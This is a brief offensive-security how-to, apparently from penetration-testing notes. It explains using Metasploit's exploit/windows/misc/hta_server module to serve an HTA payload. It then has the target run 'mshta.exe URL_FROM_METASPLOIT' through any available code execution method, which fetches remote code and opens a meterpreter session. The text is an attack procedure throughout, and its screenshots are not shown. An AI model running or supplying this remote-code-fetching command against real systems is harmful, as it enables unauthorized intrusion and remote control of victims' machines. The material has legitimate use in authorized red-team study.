#### Metasploit hta server

Using Metasploit module exploit/windows/misc/hta_server

![](/images/hta1.png)


Running this exploit results in two URLs

![](/images/hta2.png)


Using any code execution method available, run the following


`mshta.exe URL_FROM_METASPLOIT`

![](/images/hta3.png)


If this executes, a meterpreter session will be started

![](/images/hta4.png)